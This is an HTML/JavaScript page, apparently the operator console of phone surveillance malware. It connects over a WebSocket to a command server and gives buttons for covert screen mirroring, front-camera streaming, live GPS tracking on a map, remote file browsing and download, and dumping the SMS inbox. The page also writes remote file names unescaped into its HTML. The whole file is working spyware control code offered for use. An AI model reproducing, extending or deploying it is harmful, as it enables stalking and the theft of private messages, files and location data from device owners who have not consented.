<!DOCTYPE html>
<html>
<head>
    <title>SystemSync GOD Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

/* ===== GLOBAL ===== */

body{
    margin:0;
    background:radial-gradient(circle at top,#050505,#000);
    color:#00f7ff;
    font-family:Consolas,monospace;
    display:flex;
    height:100vh;
    overflow:hidden;
}

/* ===== SIDEBAR ===== */

#sidebar{
    width:270px;
    background:linear-gradient(180deg,#020202,#000);
    border-right:1px solid #00f7ff22;
    padding:20px;
    box-shadow:0 0 30px #00f7ff11;
}

.logo{
    font-size:20px;
    letter-spacing:3px;
    margin-bottom:25px;
    color:#00f7ff;
}

.section{
    margin-bottom:25px;
}

.section-title{
    font-size:11px;
    letter-spacing:2px;
    color:#00f7ff88;
    margin-bottom:10px;
}

/* ===== BUTTONS ===== */

button{
    width:100%;
    padding:10px;
    margin:6px 0;
    background:#000;
    color:#00f7ff;
    border:1px solid #00f7ff55;
    border-radius:6px;
    cursor:pointer;
    transition:.25s;
}

button:hover{
    background:#00f7ff;
    color:#000;
    box-shadow:0 0 12px #00f7ff;
}

/* ===== MAIN ===== */

#main{
    flex:1;
    display:flex;
    flex-direction:column;
}

/* HEADER */

#header{
    height:60px;
    border-bottom:1px solid #00f7ff22;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 25px;
    background:#020202;
}

.status{
    padding:5px 14px;
    border-radius:20px;
    font-size:12px;
    border:1px solid #00f7ff55;
}

/* ===== CONTENT ===== */

#content{
    flex:1;
    display:flex;
    gap:20px;
    padding:20px;
}

/* VIDEO PANEL */

#video-panel{
    flex:2;
    background:#020202;
    border-radius:12px;
    border:1px solid #00f7ff33;
    box-shadow:0 0 40px #00f7ff11 inset;
    display:flex;
    align-items:center;
    justify-content:center;
}

video{
    width:100%;
    height:100%;
    object-fit:contain;
    border-radius:12px;
}

/* DATA PANEL */

#data-panel{
    flex:1;
    background:#020202;
    border-radius:12px;
    border:1px solid #00f7ff33;
    overflow-y:auto;
    padding:15px;
}

/* DATA CARD */

.card{
    background:#000;
    border-left:3px solid #00f7ff;
    padding:8px;
    margin-bottom:8px;
    font-size:12px;
}

/* MAP */

#map{
    height:300px;
    border-radius:8px;
}

</style>
</head>

<body>

<!-- SIDEBAR -->

<div id="sidebar">

<div class="logo">
SYSTEMSYNC
</div>

<div class="section">
<div class="section-title">SURVEILLANCE</div>

<button onclick="startScreen()">üñ• SCREEN MIRROR</button>
<button onclick="send('camFront')">üìπ FRONT CAMERA</button>
<button onclick="send('getLocation')">üìç LIVE GPS</button>

</div>

<div class="section">
<div class="section-title">DATA</div>

<button onclick="send('ls root')">üìÇ FILE MANAGER</button>
<button onclick="send('getSMS inbox')">üí¨ SMS LOGS</button>

</div>

</div>

<!-- MAIN -->

<div id="main">

<div id="header">
<div>GOD CONTROL PANEL</div>
<div id="status" class="status">CONNECTING...</div>
</div>

<div id="content">

<div id="video-panel">
<video id="remoteVideo" autoplay playsinline></video>
</div>

<div id="data-panel">
<div id="map"></div>
<div id="data"></div>
</div>

</div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const ws = new WebSocket("wss://mirror-view.onrender.com");
let mapInstance = null;

let pc = new RTCPeerConnection({
    iceServers:[{urls:'stun:stun.l.google.com:19302'}]
});

/* CONNECTION */

ws.onopen = () => {
    ws.send("I_AM_WEB");
    setStatus("ONLINE");
};

ws.onclose = () => setStatus("OFFLINE");

/* MESSAGE ROUTING */

ws.onmessage = (e)=>{

    const msg = e.data;

    if(msg.startsWith("LOC_DATA:"))
        renderMap(JSON.parse(msg.substring(9)));

    else if(msg.startsWith("FILE_LIST:"))
        renderFiles(JSON.parse(msg.substring(10)));

    else if(msg.startsWith("SMS_DATA:"))
        renderLogs(JSON.parse(msg.substring(9)));

    else if(msg.startsWith("RTC_ANSWER:")){
        pc.setRemoteDescription(
            new RTCSessionDescription(
                JSON.parse(msg.substring(11))
            )
        );
    }
};

/* COMMAND */

function send(cmd){
    ws.send(cmd);
}

/* WEBRTC START */

async function startScreen(){

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);

    ws.send("RTC_OFFER:screen:" + JSON.stringify(offer));
}

pc.ontrack = (event)=>{
    document.getElementById('remoteVideo')
        .srcObject = event.streams[0];
};

/* MAP */

function renderMap(data){

    if(mapInstance) mapInstance.remove();

    mapInstance = L.map('map')
        .setView([data.lat,data.lon],18);

    L.tileLayer(
        'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
    ).addTo(mapInstance);

    L.circle(
        [data.lat,data.lon],
        {radius:data.acc}
    ).addTo(mapInstance);
}

/* FILES */

function renderFiles(files){

    const html = files.map(f=>`
        <div class="card">
        ${f.isDir?'üìÅ':'üìÑ'} ${f.name}
        <button style="width:auto;float:right"
        onclick="send('${f.isDir?'ls':'dl'} ${f.path}')">
        OPEN
        </button>
        </div>
    `).join("");

    document.getElementById('data').innerHTML = html;
}

/* SMS */

function renderLogs(data){

    document.getElementById('data').innerHTML =
        data.map(d=>`
            <div class="card">
            ${JSON.stringify(d)}
            </div>
        `).join("");
}

/* STATUS */

function setStatus(text){

    const el = document.getElementById("status");

    el.innerText = text;

    el.style.borderColor =
        text==="ONLINE" ? "#00ff99" : "#ff4444";

    el.style.color =
        text==="ONLINE" ? "#00ff99" : "#ff4444";
}

</script>
</body>
</html>


